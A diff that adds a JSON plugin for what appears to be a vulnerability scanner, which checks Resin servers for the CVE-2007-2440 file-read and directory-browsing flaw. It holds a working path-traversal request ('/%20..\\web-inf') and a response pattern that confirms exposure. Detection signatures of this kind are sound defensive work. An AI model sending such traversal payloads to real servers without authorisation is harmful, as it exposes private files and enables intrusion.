@@ -1,0 +1,18 @@
+{
+    "name" : "Resin任意文件读取_3",
+    "info" : "Resin File Read And Directory Browsing Vul CVE:2007-2440",
+    "level" : "高危",
+    "type" : "文件读取",
+    "author" : "wolf@YSRC",
+	"url": "",
+	"keyword" : "tag:resin",
+	"source" : 1,
+    "plugin" : {
+        "url" : "/%20..\\\\web-inf",
+        "tag" : "存在CVE:2007-2440漏洞",
+        "analyzing" : "keyword",
+        "analyzingdata" : "<h1>Directory of",
+        "data" : "",
+        "method" : "GET"
+    }
+}
